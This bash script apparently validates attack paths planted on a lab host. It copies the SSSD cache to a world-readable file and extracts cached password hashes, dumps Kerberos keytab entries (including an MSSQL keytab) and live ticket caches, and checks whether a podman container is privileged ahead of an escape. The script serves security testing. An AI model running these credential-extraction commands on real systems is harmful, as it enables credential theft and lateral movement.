#!/bin/bash
# Branch D validation on linux01: WT045 SSSD, WT046 keytab, WT047 NFS krb5p, WT048 podman escape
set -x

echo "=== WT045: SSSD Ticket Extraction ==="
echo "--- SSSD db files ---"
sudo ls -la /var/lib/sss/db/ 2>/dev/null
echo "--- copy cache ldb ---"
CACHE=$(sudo ls /var/lib/sss/db/cache_*.ldb 2>/dev/null | head -1)
if [ -n "$CACHE" ]; then
  sudo cp "$CACHE" /tmp/sssd_cache.ldb && sudo chmod 644 /tmp/sssd_cache.ldb
  echo "copied $CACHE"
  echo "--- ldbsearch cachedPassword ---"
  if command -v ldbsearch >/dev/null 2>&1; then
    ldbsearch -H /tmp/sssd_cache.ldb '(cachedPassword=*)' cachedPassword name 2>/dev/null | head -20 || true
  else
    echo "no ldbsearch; strings fallback:"
    sudo strings /tmp/sssd_cache.ldb 2>/dev/null | grep -iE 'cachedPassword|krbPrincipalName' | head -10 || true
  fi
else
  echo "NO SSSD CACHE FILE"
fi
echo "--- live ccaches ---"
klist 2>/dev/null || echo "no klist tickets"
sudo ls -la /tmp/krb5cc* /run/user/*/krb5cc* 2>/dev/null || true

echo "=== WT046: MSSQL Keytab Extraction ==="
echo "--- /etc/krb5.keytab ---"
sudo ls -la /etc/krb5.keytab 2>/dev/null && sudo klist -k /etc/krb5.keytab 2>/dev/null | head -10 || echo "no /etc/krb5.keytab"
echo "--- /var/opt/mssql/secrets/mssql.keytab ---"
sudo ls -la /var/opt/mssql/secrets/ 2>/dev/null || echo "no mssql secrets dir"
sudo klist -k /var/opt/mssql/secrets/mssql.keytab 2>/dev/null | head -10 || true

echo "=== WT047: NFS Kerberos Mount (prereq check) ==="
echo "--- NFS exports ---"
sudo cat /etc/exports 2>/dev/null || true
echo "--- current tickets ---"
klist 2>/dev/null || echo "no TGT"
echo "--- secure-share dir ---"
sudo ls -la /exports/secure-share 2>/dev/null || echo "no secure-share"

echo "=== WT048: Podman Container Escape (prereq check) ==="
echo "--- podman containers ---"
sudo podman ps -a 2>/dev/null || echo "no podman"
echo "--- cadre-monitor inspect (privileged?) ---"
sudo podman inspect cadre-monitor --format '{{.HostConfig.Privileged}} {{.State.Pid}}' 2>/dev/null || echo "no cadre-monitor container"
echo "=== BRANCH_D_DIAG_DONE ==="
